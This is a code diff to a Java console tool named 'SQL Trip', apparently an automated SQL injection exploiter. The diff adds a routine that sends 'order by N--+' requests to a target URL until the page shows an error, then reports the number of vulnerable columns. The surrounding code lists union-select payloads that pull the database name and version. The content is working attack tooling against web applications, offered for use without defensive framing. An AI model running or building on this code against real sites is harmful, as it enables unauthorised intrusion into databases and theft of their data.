@@ -32,6 +32,9 @@ if(choice.equalsIgnoreCase("yes") || choice.equalsIgnoreCase("Y"))
 System.out.print("\n\n Starting SQL Trip...Please wait... ");
 Thread.sleep(2000);
 System.out.print("\n\n Started...\n\n");
+int vulncolscount=orderbyclausecheck(url);
+System.out.print(ConsoleColors.CYAN_BOLD+"\n\n\n\n THERE ARE "+vulncolscount+" VULNERABLE COLUMNS"+ConsoleColors.RESET);
+Thread.sleep(3000);
 String urlworkwith=url.toString();
 String s=urlworkwith; String end="--+";String s1="";
 String sql_commands[]={" order by 1"," union all select 1,2"," union all select database(),version()",
@@ -155,5 +158,46 @@ System.out.print("\n \n \n\n Press Enter To go to Main Program... \n\n |||||||||
 BufferedReader br=new BufferedReader(new InputStreamReader(System.in));
 br.readLine();
 main(new String[0]);
+}
+public static int orderbyclausecheck(URL urltocheckobyclause)throws Exception
+{
+boolean flag=false;
+String urlworkwith=urltocheckobyclause.toString();
+String s=urlworkwith; String end="--+";
+String c,d;
+c=s+" order by ";
+int count=1;
+System.out.print(ConsoleColors.PURPLE_BOLD+"\n\n\n SQL Trip CHECKING FOR VULNERABLE COLUMNS "+ConsoleColors.RESET);
+
+while(flag==false)
+{
+c=c+count;
+d=c+end;
+URL sqlinjurl=new URL(d);
+URLConnection urlConnection = sqlinjurl.openConnection();
+HttpURLConnection connection = null;
+System.out.print(ConsoleColors.RED_BOLD+"\n\n PARSING NEW REQUEST "+ConsoleColors.RESET);
+System.out.print(ConsoleColors.GREEN_BRIGHT+"\n\n CHECKING "+d+""+ConsoleColors.RESET);
+Thread.sleep(750);
+
+if(urlConnection instanceof HttpURLConnection) {
+connection = (HttpURLConnection) urlConnection;
+}else {
+System.out.println("Please enter an HTTP URL.");return 0;
+}
+BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+String urlString = "";
+String current;
+while((current = in.readLine()) != null) {
+urlString += current;
+}
+//System.out.println(urlString);
+if((urlString.indexOf("Error"))>=0 || (urlString.indexOf("ERROR"))>=0 || (urlString.indexOf("error"))>=0 ||(urlString.indexOf("warning"))>=0 ||
+(urlString.indexOf("WARNING"))>=0 ||(urlString.indexOf("Warning"))>=0)
+{flag=true;}
+c=c+",";
+count++;
+}
+return (count-2);  
 }
 }
